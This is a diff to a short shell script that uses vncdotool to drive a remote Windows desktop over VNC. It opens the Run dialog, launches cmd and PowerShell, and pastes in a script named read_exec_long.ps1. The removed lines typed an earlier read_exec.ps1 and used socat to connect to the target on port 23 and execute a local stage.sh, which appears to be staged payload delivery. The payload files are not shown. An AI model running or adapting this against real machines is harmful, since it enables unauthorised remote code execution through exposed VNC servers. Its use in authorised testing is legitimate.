@@ -1,11 +1,12 @@
 #!/bin/sh
 
-vncdo -s $1 -p password \
+python vncdotool/vncdotool/command.py -s $1 \
 	pause 2 \
 	key meta-r \
 	pause 2 \
+	type "cmd" \
+	key enter \
+	pause 3 \
 	type "powershell" \
 	key enter \
-	pause 2 \
-	typefile powershell/read_exec.ps1 && \
-	socat TCP:$1:23 EXEC:"./stage.sh $2"
+	pastefile powershell/read_exec_long.ps1
